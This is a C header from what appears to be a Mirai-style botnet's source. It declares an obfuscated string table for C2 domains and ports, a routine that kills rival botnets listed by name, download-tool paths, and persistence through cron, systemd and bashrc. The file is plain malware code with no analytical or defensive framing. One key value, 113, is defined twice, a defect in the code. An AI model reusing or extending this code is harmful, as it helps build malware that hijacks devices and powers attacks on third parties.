#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char    *val;
    uint16_t val_len;
    uint8_t  locked;   /* 1 = ChaCha20-encrypted in memory, 0 = plaintext */
};

#define TABLE_CNC_PORT                  1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_KILLER_PROC               3
#define TABLE_KILLER_EXE                4
#define TABLE_KILLER_FD                 5
#define TABLE_KILLER_MAPS               6
#define TABLE_KILLER_TCP                7
#define TABLE_KILLER_STATUS             8
#define TABLE_KILLER_ANIME              9
#define TABLE_MEM_ROUTE                 10
#define TABLE_MEM_CPUINFO               11
#define TABLE_MEM_BOGO                  12
#define TABLE_MEM_RC                    13
#define TABLE_MEM_MIRAI                 14
#define TABLE_MEM_SORA1                 15
#define TABLE_MEM_SORA2                 16
#define TABLE_MEM_SORA3                 17
#define TABLE_MEM_OWARI                 18
#define TABLE_MEM_OWARI2                19
#define TABLE_MEM_JOSHO                 20
#define TABLE_MEM_APOLLO                21
#define TABLE_MEM_MASUTA                22
#define TABLE_MEM_VAMP                  23
#define TABLE_MEM_IRC1                  24
#define TABLE_MEM_QBOT1                 25
#define TABLE_MEM_QBOT2                 26
#define TABLE_MEM_IRC2                  27
#define TABLE_MEM_OMNI                  28
#define TABLE_MEM_SHINTO                29
#define TABLE_MEM_JOSHO5                30
#define TABLE_MEM_JOSHO4                31
#define TABLE_MEM_LOL                   32
#define TABLE_ATK_RESOLVER              34
#define TABLE_ATK_NSERV                 35
#define TABLE_MISC_WATCHDOG             36
#define TABLE_MISC_WATCHDOG2            37
#define TABLE_CNC_DOMAIN                38

#define TABLE_MEM_CHACHA      39
#define TABLE_MEM_DBG         40
#define TABLE_MEM_QTX         41
#define TABLE_MEM_HAKAI       42
#define TABLE_MEM_ATERNA      43
#define TABLE_MEM_ZOLLARD     44
#define TABLE_MEM_REMAITEN    45
#define TABLE_MEM_UPX         46
#define TABLE_KILLER_WDT      47
#define TABLE_KILLER_WDT2     48

#define TABLE_MEM_CONDI       49
#define TABLE_MEM_JOKER       50
#define TABLE_MEM_COSMIC      51
#define TABLE_MEM_MANJI       52
#define TABLE_MEM_STAR        53
#define TABLE_MEM_ADBG        54
#define TABLE_MEM_WTG         55
#define TABLE_MEM_SNOOPY      56
#define TABLE_MEM_EAGLEWARE   57
#define TABLE_MEM_DEBUGBOT    58
#define TABLE_MEM_INDIA       59

#define TABLE_PATH_PROC_SELF_EXE   60
#define TABLE_PATH_PROC_NET_TCP    61
#define TABLE_PATH_DEV_URANDOM     62
#define TABLE_PATH_CMD_LINE        63
#define TABLE_PATH_BUSYBOX         64
#define TABLE_PATH_LIB_SYSTEMD     65
#define TABLE_PATH_USR_LIB         66
#define TABLE_STR_WATCHDOG         67
#define TABLE_STR_WDT              68
#define TABLE_STR_TELNETD          69
#define TABLE_STR_SSHD             70
#define TABLE_STR_DROPBEAR         71
#define TABLE_STR_NEWLINE          72
#define TABLE_STR_NULL_BYTE        73
#define TABLE_STR_ALPHASET         74
#define TABLE_STR_IP_LO            75
#define TABLE_STR_INODE_PORT       76
#define TABLE_MIRAI_KEY_BYTES      77

#define TABLE_MEM_GAFGYT       78
#define TABLE_MEM_SATORI       79
#define TABLE_MEM_HAJIME       80
#define TABLE_MEM_MOZI         81
#define TABLE_MEM_BASHLITE     82
#define TABLE_MEM_TSUNAMI      83
#define TABLE_MEM_MUHSTIK      84
#define TABLE_MEM_XORDDOS      85
#define TABLE_MEM_MAYDAY       86
#define TABLE_MEM_KATANA       87
#define TABLE_MEM_PINKBOT      88
#define TABLE_MEM_LIGHTAIDRA   89
#define TABLE_MEM_SAKURA       104
#define TABLE_MEM_KIRAZ        105
#define TABLE_MEM_MORTE        106
#define TABLE_MEM_HTTP_BROWSER 107
#define TABLE_MEM_ASTRO        108
#define TABLE_MEM_BOTNET_AIO   112
#define TABLE_MEM_INDIATECH    113
#define TABLE_MEM_SORA_BINARY  114
#define TABLE_MEM_TMP_JNO      115
#define TABLE_MEM_TMP_WLANCONT 116
#define TABLE_MEM_APEX         117

#define TABLE_CNC_DOMAIN2      90
#define TABLE_CNC_DOMAIN3      91
#define TABLE_CNC_DOMAIN4      92
#define TABLE_CNC_PORT2        93
#define TABLE_CNC_PORT3        94
#define TABLE_CNC_PORT4        95
#define TABLE_PATH_WGET        96
#define TABLE_PATH_CURL        97
#define TABLE_PATH_TFTP        98
#define TABLE_PATH_FTP         99
#define TABLE_PATH_FETCH      100
#define TABLE_PERSIST_CRON    101
#define TABLE_PERSIST_SYSTEMD 102
#define TABLE_PERSIST_BASHRC  103
#define TABLE_STR_RELOAD      109
#define TABLE_STR_PERSIST     110
#define TABLE_STR_SIGNED      111
#define TABLE_STR_SMALLPOWER  113
#define TABLE_MAX_KEYS  118

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

void add_entry(uint8_t, const uint8_t *, int);
void toggle_obf(uint8_t);
